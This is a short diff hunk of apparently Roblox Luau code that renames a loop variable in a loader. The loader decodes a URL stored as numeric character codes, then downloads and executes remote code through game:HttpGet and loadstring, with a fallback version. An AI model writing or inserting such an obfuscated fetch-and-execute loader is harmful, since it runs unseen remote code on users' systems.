@@ -8,7 +8,7 @@ b = {104,116,116,112,115,58,47,47,114,97,119,46,
 	117,97};lat = "2.2"
 
 local g = function(v)
-	local map="";for _,v in ipairs(b) do map ..= string.char(v) end
+	local map="";for _,kv in ipairs(b) do map ..= string.char(kv) end
 	local fi=map:format(`v{tostring(v):gsub("%.", "_")}`);
 	local s,f=pcall(function()return loadstring(game:HttpGet(fi))()end);
 	if not s and v ~= lat then s,f = pcall(function()return loadstring(game:HttpGet(map:format(`v{tostring(lat):gsub("%.", "_")}`)))()end) end;
